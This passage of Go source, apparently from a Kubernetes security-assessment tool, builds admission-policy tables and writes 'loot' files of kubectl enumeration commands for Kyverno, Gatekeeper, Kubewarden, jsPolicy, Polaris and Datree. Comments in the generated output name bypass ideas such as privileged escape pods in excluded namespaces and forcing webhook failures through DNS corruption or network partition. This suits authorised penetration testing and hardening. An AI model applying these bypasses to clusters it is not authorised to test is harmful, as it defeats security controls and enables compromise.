		details := fmt.Sprintf("Background: %t", policy.Background)
		issuesStr := "<NONE>"
		if failureAction == "Audit" {
			issuesStr = "Non-blocking (Audit mode)"
		}

		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
			Namespace:     ns,
			Tool:          "Kyverno",
			Name:          policy.Name,
			Scope:         scope,
			Target:        "Matched resources",
			Type:          policyType,
			Configuration: configStr,
			Details:       details,
			Issues:        issuesStr,
		})
	}

	// Add Kyverno exceptions
	for _, exception := range kyvernoExceptions {
		policiesStr := "<NONE>"
		if len(exception.Policies) > 0 {
			policiesStr = strings.Join(exception.Policies, ", ")
		}
		configStr := fmt.Sprintf("Exempts %d policies", len(exception.Policies))
		details := fmt.Sprintf("Policies: %s", policiesStr)
		issuesStr := "Policy bypass configured"

		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
			Namespace:     exception.Namespace,
			Tool:          "Kyverno",
			Name:          exception.Name,
			Scope:         "Namespace",
			Target:        "Exception subjects",
			Type:          "PolicyException",
			Configuration: configStr,
			Details:       details,
			Issues:        issuesStr,
		})
	}

	// Add Kubewarden policies
	for _, policy := range kubewardenPolicies {
		scope := "Cluster"
		ns := "<ALL>"
		policyType := "ClusterAdmissionPolicy"
		if !policy.IsClusterPolicy {
			scope = "Namespace"
			ns = policy.Namespace
			policyType = "AdmissionPolicy"
		}
		mutatingStr := "Validating"
		if policy.Mutating {
			mutatingStr = "Mutating"
		}
		configStr := fmt.Sprintf("Mode: %s, %s", policy.Mode, mutatingStr)
		details := fmt.Sprintf("Module: %s", policy.Module)
		issuesStr := "<NONE>"
		if policy.Mode == "monitor" {
			issuesStr = "Non-blocking (monitor mode)"
		}

		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
			Namespace:     ns,
			Tool:          "Kubewarden",
			Name:          policy.Name,
			Scope:         scope,
			Target:        "Matched resources",
			Type:          policyType,
			Configuration: configStr,
			Details:       details,
			Issues:        issuesStr,
		})
	}

	// Add jsPolicy policies
	for _, policy := range jsPolicies {
		scope := "Cluster"
		ns := "<ALL>"
		if !policy.IsClusterPolicy {
			scope = "Namespace"
			ns = policy.Namespace
		}
		violationPolicy := policy.ViolationPolicy
		if violationPolicy == "" {
			violationPolicy = "deny"
		}
		configStr := fmt.Sprintf("Type: %s, Violation: %s", policy.Type, violationPolicy)
		details := "JavaScript-based policy"
		issuesStr := "<NONE>"
		if violationPolicy == "warn" {
			issuesStr = "Non-blocking (warn mode)"
		}

		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
			Namespace:     ns,
			Tool:          "jsPolicy",
			Name:          policy.Name,
			Scope:         scope,
			Target:        "Matched resources",
			Type:          policy.Type,
			Configuration: configStr,
			Details:       details,
			Issues:        issuesStr,
		})
	}

	// Add Gatekeeper exclusions
	for _, excludedNs := range gatekeeperConfig.ExcludedNamespaces {
		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
			Namespace:     excludedNs,
			Tool:          "Gatekeeper",
			Name:          "Config.spec.match.excludedNamespaces",
			Scope:         "Cluster",
			Target:        excludedNs,
			Type:          "Exclusion",
			Configuration: "Namespace excluded",
			Details:       "No Gatekeeper enforcement in this namespace",
			Issues:        "Policy bypass for namespace",
		})
	}

	// Build unified policies table rows
	// Schema: Namespace | Tool | Name | Scope | Target | Type | Configuration | Details | Issues
	unifiedPoliciesHeaders := []string{
		"Namespace",
		"Tool",
		"Name",
		"Scope",
		"Target",
		"Type",
		"Configuration",
		"Details",
		"Issues",
	}
	var unifiedPoliciesRows [][]string
	for _, policy := range unifiedPolicies {
		unifiedPoliciesRows = append(unifiedPoliciesRows, []string{
			policy.Namespace,
			policy.Tool,
			policy.Name,
			policy.Scope,
			policy.Target,
			policy.Type,
			policy.Configuration,
			policy.Details,
			policy.Issues,
		})
	}

	// PSP-specific loot
	if len(pspAnalyses) > 0 {
		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("# PSP ENUMERATION")
		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all PSPs:")
		loot.Section("pod-admission").Add("kubectl get psp")
		loot.Section("pod-admission").Add("")

		for _, psp := range pspAnalyses {
			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("# PSP: %s", psp.Name)
			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("kubectl get psp %s -o yaml", psp.Name)
			loot.Section("pod-admission").Add("")
			loot.Section("pod-admission").Add("# Security Configuration:")
			loot.Section("pod-admission").Addf("#   Privileged: %t", psp.AllowsPrivileged)
			loot.Section("pod-admission").Addf("#   HostNetwork: %t", psp.AllowsHostNetwork)
			loot.Section("pod-admission").Addf("#   HostPID: %t", psp.AllowsHostPID)
			loot.Section("pod-admission").Addf("#   HostIPC: %t", psp.AllowsHostIPC)
			loot.Section("pod-admission").Addf("#   HostPath: %t", psp.AllowsHostPath)
			if len(psp.AllowedCapabilities) > 0 {
				loot.Section("pod-admission").Addf("#   Dangerous Capabilities: %s", strings.Join(psp.AllowedCapabilities, ", "))
			}
			loot.Section("pod-admission").Add("")

			// Check which service accounts can use this PSP
			loot.Section("pod-admission").Add("# Find service accounts that can use this PSP:")
			loot.Section("pod-admission").Addf("kubectl get clusterrolebinding -o json | jq '.items[] | select(.roleRef.name==\"%s\") | {name: .metadata.name, subjects: .subjects}'", psp.Name)
			loot.Section("pod-admission").Addf("kubectl get rolebinding --all-namespaces -o json | jq '.items[] | select(.roleRef.name==\"%s\") | {namespace: .metadata.namespace, name: .metadata.name, subjects: .subjects}'", psp.Name)
			loot.Section("pod-admission").Add("")

			// Exploitation commands if PSP allows dangerous configs
			if psp.AllowsPrivileged || psp.AllowsHostPath || len(psp.AllowedCapabilities) > 0 {
				loot.Section("pod-admission").Add("# EXPLOITATION:")
				if psp.AllowsPrivileged {
					loot.Section("pod-admission").Add("# This PSP allows privileged containers - deploy escape pod")
				}
				if psp.AllowsHostPath {
					loot.Section("pod-admission").Add("# This PSP allows hostPath - mount host filesystem")
				}
				if len(psp.AllowedCapabilities) > 0 {
					loot.Section("pod-admission").Addf("# This PSP allows dangerous capabilities: %s", strings.Join(psp.AllowedCapabilities, ", "))
				}
				loot.Section("pod-admission").Add("")
			}
		}
	}

	// Webhook-specific loot
	if len(mutatingWebhooks) > 0 || len(validatingWebhooks) > 0 {
		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("# WEBHOOK ENUMERATION")
		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all admission webhooks:")
		loot.Section("pod-admission").Add("kubectl get mutatingwebhookconfigurations")
		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfigurations")
		loot.Section("pod-admission").Add("")

		for _, wh := range mutatingWebhooks {
			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("# Mutating Webhook: %s", wh.Name)
			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("kubectl get mutatingwebhookconfiguration %s -o yaml", wh.Name)
			loot.Section("pod-admission").Addf("# Failure Policy: %s", wh.FailurePolicy)
			if wh.FailurePolicy == "Ignore" {
				loot.Section("pod-admission").Add("#")
				loot.Section("pod-admission").Add("# [BYPASS] failurePolicy=Ignore - webhook failures won't block pods")
				loot.Section("pod-admission").Add("# Techniques to trigger webhook failure:")
				loot.Section("pod-admission").Add("#   1. Network partition - block webhook endpoint")
				loot.Section("pod-admission").Add("#   2. Timeout - slow response > timeoutSeconds")
				loot.Section("pod-admission").Add("#   3. DNS failure - corrupt webhook service DNS")
				loot.Section("pod-admission").Add("#   4. Certificate expiry - wait for TLS cert to expire")
			}
			if wh.HasExclusions {
				loot.Section("pod-admission").Add("#")
				loot.Section("pod-admission").Add("# [BYPASS] Namespace selector configured - some namespaces excluded")
				loot.Section("pod-admission").Add("# Check which namespaces are excluded:")
				loot.Section("pod-admission").Addf("kubectl get mutatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", wh.Name)
			}
			loot.Section("pod-admission").Add("")
		}

		for _, wh := range validatingWebhooks {
			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("# Validating Webhook: %s", wh.Name)
			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", wh.Name)
			loot.Section("pod-admission").Addf("# Failure Policy: %s", wh.FailurePolicy)
			if wh.FailurePolicy == "Ignore" {
				loot.Section("pod-admission").Add("#")
				loot.Section("pod-admission").Add("# [BYPASS] failurePolicy=Ignore - webhook failures won't block pods")
				loot.Section("pod-admission").Add("# Techniques to trigger webhook failure:")
				loot.Section("pod-admission").Add("#   1. Network partition - block webhook endpoint")
				loot.Section("pod-admission").Add("#   2. Timeout - slow response > timeoutSeconds")
				loot.Section("pod-admission").Add("#   3. DNS failure - corrupt webhook service DNS")
				loot.Section("pod-admission").Add("#   4. Certificate expiry - wait for TLS cert to expire")
			}
			if wh.HasExclusions {
				loot.Section("pod-admission").Add("#")
				loot.Section("pod-admission").Add("# [BYPASS] Namespace selector configured - some namespaces excluded")
				loot.Section("pod-admission").Add("# Check which namespaces are excluded:")
				loot.Section("pod-admission").Addf("kubectl get validatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", wh.Name)
			}
			loot.Section("pod-admission").Add("")
		}
	}

	// VAP-specific loot
	if len(vapPolicies) > 0 {
		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("# VALIDATING ADMISSION POLICY ENUMERATION")
		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all ValidatingAdmissionPolicies:")
		loot.Section("pod-admission").Add("kubectl get validatingadmissionpolicies")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all ValidatingAdmissionPolicyBindings:")
		loot.Section("pod-admission").Add("kubectl get validatingadmissionpolicybindings")
		loot.Section("pod-admission").Add("")

		for _, vap := range vapPolicies {
			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("# VAP: %s", vap.Name)
			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("kubectl get validatingadmissionpolicy %s -o yaml", vap.Name)
			loot.Section("pod-admission").Addf("# Failure Policy: %s", vap.FailurePolicy)
			loot.Section("pod-admission").Addf("# Validations: %d", vap.Validations)
			if len(vap.Bindings) > 0 {
				loot.Section("pod-admission").Addf("# Bindings: %s", strings.Join(vap.Bindings, ", "))
				loot.Section("pod-admission").Add("")
				loot.Section("pod-admission").Add("# Check binding details:")
				for _, binding := range vap.Bindings {
					loot.Section("pod-admission").Addf("kubectl get validatingadmissionpolicybinding %s -o yaml", binding)
				}
			}
			if vap.FailurePolicy == "Ignore" {
				loot.Section("pod-admission").Add("#")
				loot.Section("pod-admission").Add("# [BYPASS] failurePolicy=Ignore - policy failures won't block")
				loot.Section("pod-admission").Add("# Techniques to trigger CEL evaluation failure:")
				loot.Section("pod-admission").Add("#   1. Send malformed data that causes CEL panic")
				loot.Section("pod-admission").Add("#   2. Exceed expression evaluation cost limits")
			}
			loot.Section("pod-admission").Add("")
		}
	}

	// Gatekeeper-specific loot
	if len(gatekeeperConstraints) > 0 {
		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("# OPA GATEKEEPER ENUMERATION")
		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all ConstraintTemplates:")
		loot.Section("pod-admission").Add("kubectl get constrainttemplates")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all constraints across all templates:")
		loot.Section("pod-admission").Add("kubectl get constraints")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# Check Gatekeeper system status:")
		loot.Section("pod-admission").Add("kubectl get pods -n gatekeeper-system")
		loot.Section("pod-admission").Add("kubectl logs -l control-plane=controller-manager -n gatekeeper-system --tail=50")
		loot.Section("pod-admission").Add("")

		// Group constraints by kind
		constraintsByKind := make(map[string][]GatekeeperConstraintInfo)
		for _, c := range gatekeeperConstraints {
			constraintsByKind[c.Kind] = append(constraintsByKind[c.Kind], c)
		}

		for kind, constraints := range constraintsByKind {
			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("# Constraint Template Kind: %s", kind)
			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("kubectl get %s", strings.ToLower(kind))
			loot.Section("pod-admission").Add("")

			for _, c := range constraints {
				loot.Section("pod-admission").Addf("# Constraint: %s", c.Name)
				loot.Section("pod-admission").Addf("kubectl get %s %s -o yaml", strings.ToLower(kind), c.Name)
				loot.Section("pod-admission").Addf("# Enforcement: %s", c.EnforcementAction)
				if c.Violations > 0 {
					loot.Section("pod-admission").Addf("# [!] %d existing violation(s)", c.Violations)
				}
				if c.EnforcementAction == "dryrun" || c.EnforcementAction == "warn" {
					loot.Section("pod-admission").Add("#")
					loot.Section("pod-admission").Addf("# [WEAK] Enforcement action '%s' - violations not blocked", c.EnforcementAction)
				}
				loot.Section("pod-admission").Add("")
			}
		}

		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("# GATEKEEPER BYPASS TECHNIQUES")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 1. Webhook failure bypass (if failurePolicy=Ignore):")
		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration gatekeeper-validating-webhook-configuration -o yaml | grep failurePolicy")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 2. Namespace exclusion (check for exempt namespaces):")
		loot.Section("pod-admission").Add("kubectl get config.config.gatekeeper.sh config -o jsonpath='{.spec.match[*].excludedNamespaces}'")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 3. Check for dryrun/warn constraints:")
		loot.Section("pod-admission").Add("kubectl get constraints -o jsonpath='{range .items[*]}{.kind}/{.metadata.name}: {.spec.enforcementAction}{\"\\n\"}{end}'")
		loot.Section("pod-admission").Add("")
	}

	// Kyverno-specific loot
	if len(kyvernoPolicies) > 0 || len(kyvernoExceptions) > 0 {
		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("# KYVERNO ENUMERATION")
		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all ClusterPolicies:")
		loot.Section("pod-admission").Add("kubectl get clusterpolicies")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all Policies (namespace-scoped):")
		loot.Section("pod-admission").Add("kubectl get policies --all-namespaces")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List PolicyExceptions (BYPASS VECTORS!):")
		loot.Section("pod-admission").Add("kubectl get policyexceptions --all-namespaces")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# Check Kyverno system status:")
		loot.Section("pod-admission").Add("kubectl get pods -n kyverno")
		loot.Section("pod-admission").Add("")

		for _, policy := range kyvernoPolicies {
			scope := "ClusterPolicy"
			if !policy.IsClusterPolicy {
				scope = "Policy"
			}
			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("# %s: %s", scope, policy.Name)
			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
			if policy.IsClusterPolicy {
				loot.Section("pod-admission").Addf("kubectl get clusterpolicy %s -o yaml", policy.Name)
			} else {
				loot.Section("pod-admission").Addf("kubectl get policy %s -n %s -o yaml", policy.Name, policy.Namespace)
			}
			loot.Section("pod-admission").Addf("# Validation Failure Action: %s", policy.ValidationFailure)
			loot.Section("pod-admission").Addf("# Rules: %d", policy.Rules)
			if len(policy.RuleNames) > 0 {
				loot.Section("pod-admission").Addf("# Rule Names: %s", strings.Join(policy.RuleNames, ", "))
			}
			if policy.ValidationFailure == "Audit" || policy.ValidationFailure == "audit" {
				loot.Section("pod-admission").Add("#")
				loot.Section("pod-admission").Add("# [WEAK] Audit mode - violations logged but not blocked")
			}
			loot.Section("pod-admission").Add("")
		}

		// Policy Exceptions are critical bypass vectors
		if len(kyvernoExceptions) > 0 {
			loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
			loot.Section("pod-admission").Add("# [CRITICAL] POLICY EXCEPTIONS - BYPASS VECTORS!")
			loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
			loot.Section("pod-admission").Add("#")
			loot.Section("pod-admission").Add("# PolicyExceptions allow resources to BYPASS Kyverno policies")
			loot.Section("pod-admission").Add("# Check if you can create/modify PolicyExceptions to bypass controls")
			loot.Section("pod-admission").Add("")

			for _, exception := range kyvernoExceptions {
				loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
				loot.Section("pod-admission").Addf("# PolicyException: %s (ns: %s)", exception.Name, exception.Namespace)
				loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
				loot.Section("pod-admission").Addf("kubectl get policyexception %s -n %s -o yaml", exception.Name, exception.Namespace)
				if len(exception.Policies) > 0 {
					loot.Section("pod-admission").Addf("# Exempted Policies: %s", strings.Join(exception.Policies, ", "))
				}
				if len(exception.Rules) > 0 {
					loot.Section("pod-admission").Addf("# Exempted Rules: %s", strings.Join(exception.Rules, ", "))
				}
				loot.Section("pod-admission").Add("#")
				loot.Section("pod-admission").Add("# [ATTACK] Resources matching this exception can bypass the listed policies!")
				loot.Section("pod-admission").Add("")
			}
		}

		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("# KYVERNO BYPASS TECHNIQUES")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 1. Check if you can create PolicyExceptions:")
		loot.Section("pod-admission").Add("kubectl auth can-i create policyexceptions --all-namespaces")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 2. Webhook failure bypass (if failurePolicy=Ignore):")
		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration kyverno-resource-validating-webhook-cfg -o yaml | grep failurePolicy")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 3. Check for Audit-only policies:")
		loot.Section("pod-admission").Add("kubectl get clusterpolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.validationFailureAction}{\"\\n\"}{end}'")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 4. Check namespace exclusions:")
		loot.Section("pod-admission").Add("kubectl get configmap kyverno -n kyverno -o yaml | grep -A 10 excludeGroups")
		loot.Section("pod-admission").Add("")
	}

	// Kubewarden-specific loot
	if len(kubewardenPolicies) > 0 {
		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("# KUBEWARDEN ENUMERATION")
		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all ClusterAdmissionPolicies:")
		loot.Section("pod-admission").Add("kubectl get clusteradmissionpolicies")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all AdmissionPolicies (namespace-scoped):")
		loot.Section("pod-admission").Add("kubectl get admissionpolicies --all-namespaces")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# Check Kubewarden system status:")
		loot.Section("pod-admission").Add("kubectl get pods -n kubewarden")
		loot.Section("pod-admission").Add("kubectl get policyservers")
		loot.Section("pod-admission").Add("")

		for _, policy := range kubewardenPolicies {
			scope := "ClusterAdmissionPolicy"
			if !policy.IsClusterPolicy {
				scope = "AdmissionPolicy"
			}
			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("# %s: %s", scope, policy.Name)
			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
			if policy.IsClusterPolicy {
				loot.Section("pod-admission").Addf("kubectl get clusteradmissionpolicy %s -o yaml", policy.Name)
			} else {
				loot.Section("pod-admission").Addf("kubectl get admissionpolicy %s -n %s -o yaml", policy.Name, policy.Namespace)
			}
			loot.Section("pod-admission").Addf("# Module: %s", policy.Module)
			loot.Section("pod-admission").Addf("# Mode: %s", policy.Mode)
			loot.Section("pod-admission").Addf("# Mutating: %t", policy.Mutating)
			if policy.Mode == "monitor" {
				loot.Section("pod-admission").Add("#")
				loot.Section("pod-admission").Add("# [WEAK] Monitor mode - violations logged but not blocked")
			}
			loot.Section("pod-admission").Add("")
		}

		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("# KUBEWARDEN BYPASS TECHNIQUES")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 1. Check for monitor-mode policies:")
		loot.Section("pod-admission").Add("kubectl get clusteradmissionpolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.mode}{\"\\n\"}{end}'")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 2. Check PolicyServer status:")
		loot.Section("pod-admission").Add("kubectl get policyservers -o yaml")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 3. Webhook failure bypass:")
		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration -l kubewarden -o yaml | grep failurePolicy")
		loot.Section("pod-admission").Add("")
	}

	// jsPolicy-specific loot
	if len(jsPolicies) > 0 {
		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("# JSPOLICY ENUMERATION")
		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all ClusterJsPolicies:")
		loot.Section("pod-admission").Add("kubectl get clusterjspolicies")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# List all JsPolicies (namespace-scoped):")
		loot.Section("pod-admission").Add("kubectl get jspolicies --all-namespaces")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# Check jsPolicy system status:")
		loot.Section("pod-admission").Add("kubectl get pods -n jspolicy")
		loot.Section("pod-admission").Add("")

		for _, policy := range jsPolicies {
			scope := "ClusterJsPolicy"
			if !policy.IsClusterPolicy {
				scope = "JsPolicy"
			}
			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("pod-admission").Addf("# %s: %s", scope, policy.Name)
			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
			if policy.IsClusterPolicy {
				loot.Section("pod-admission").Addf("kubectl get clusterjspolicy %s -o yaml", policy.Name)
			} else {
				loot.Section("pod-admission").Addf("kubectl get jspolicy %s -n %s -o yaml", policy.Name, policy.Namespace)
			}
			loot.Section("pod-admission").Addf("# Type: %s", policy.Type)
			if len(policy.Operations) > 0 {
				loot.Section("pod-admission").Addf("# Operations: %s", strings.Join(policy.Operations, ", "))
			}
			if len(policy.Resources) > 0 {
				loot.Section("pod-admission").Addf("# Resources: %s", strings.Join(policy.Resources, ", "))
			}
			if policy.ViolationPolicy == "warn" {
				loot.Section("pod-admission").Add("#")
				loot.Section("pod-admission").Add("# [WEAK] Violation policy 'warn' - violations logged but not blocked")
			}
			loot.Section("pod-admission").Add("")
		}

		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("# JSPOLICY BYPASS TECHNIQUES")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 1. Check for warn-only policies:")
		loot.Section("pod-admission").Add("kubectl get clusterjspolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.violationPolicy}{\"\\n\"}{end}'")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 2. Webhook failure bypass:")
		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration jspolicy-webhook -o yaml | grep failurePolicy")
		loot.Section("pod-admission").Add("")
	}

	// Polaris-specific loot
	if polarisConfig.WebhookEnabled || polarisConfig.ConfigMap != "" {
		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("# POLARIS ENUMERATION")
		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# Check Polaris webhook:")
		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration | grep -i polaris")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# Check Polaris pods:")
		loot.Section("pod-admission").Add("kubectl get pods -n polaris")
		loot.Section("pod-admission").Add("kubectl get pods -n fairwinds")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# Get Polaris configuration:")
		loot.Section("pod-admission").Addf("kubectl get configmap polaris -n %s -o yaml", polarisConfig.Namespace)
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("# POLARIS BYPASS TECHNIQUES")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 1. Check for exemptions in config:")
		loot.Section("pod-admission").Addf("kubectl get configmap polaris -n %s -o jsonpath='{.data.config\\.yaml}' | grep -A 20 exemptions", polarisConfig.Namespace)
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 2. Webhook failure bypass:")
		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration polaris-webhook -o yaml | grep failurePolicy")
		loot.Section("pod-admission").Add("")
	}

	// Datree-specific loot
	if datreeConfig.WebhookEnabled {
		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("# DATREE ENUMERATION")
		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# Check Datree webhook:")
		loot.Section("pod-admission").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", datreeConfig.WebhookName)
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# Check Datree pods:")
		loot.Section("pod-admission").Add("kubectl get pods -n datree")
		loot.Section("pod-admission").Add("kubectl get pods --all-namespaces | grep -i datree")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("# DATREE BYPASS TECHNIQUES")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 1. Webhook failure bypass:")
		loot.Section("pod-admission").Addf("kubectl get validatingwebhookconfiguration %s -o yaml | grep failurePolicy", datreeConfig.WebhookName)
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# 2. Check for namespace exclusions:")
		loot.Section("pod-admission").Addf("kubectl get validatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", datreeConfig.WebhookName)
		loot.Section("pod-admission").Add("")
	}

	// Gatekeeper exclusions loot (if any exist)
	if len(gatekeeperConfig.ExcludedNamespaces) > 0 {
		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("# [CRITICAL] NAMESPACE EXCLUSIONS - BYPASS VECTORS!")
		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# The following namespaces are EXCLUDED from Gatekeeper constraints:")
		for _, ns := range gatekeeperConfig.ExcludedNamespaces {
			loot.Section("pod-admission").Addf("#   - %s", ns)
		}
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# [ATTACK] Deploy privileged pods in excluded namespaces to bypass Gatekeeper!")
		loot.Section("pod-admission").Add("")
		loot.Section("pod-admission").Add("# Check Gatekeeper Config:")
		loot.Section("pod-admission").Add("kubectl get config.config.gatekeeper.sh config -o yaml")
		loot.Section("pod-admission").Add("")
	}

	// Sort by namespace name
	sort.SliceStable(outputRows, func(i, j int) bool {
		return outputRows[i][0] < outputRows[j][0]
	})

	// Build tables
	// Always include: Summary + Unified Policies
	tables := []internal.TableFile{
		{
			Name:   "Pod-Admission-Namespaces",
			Header: headers,
			Body:   outputRows,
		},
	}

	// Add unified policies table if any policies exist
	if len(unifiedPoliciesRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Pod-Admission-Policy-Overview",
			Header: unifiedPoliciesHeaders,
			Body:   unifiedPoliciesRows,
		})
	}

	// Detail tables - only with --detailed flag
	if detailed {
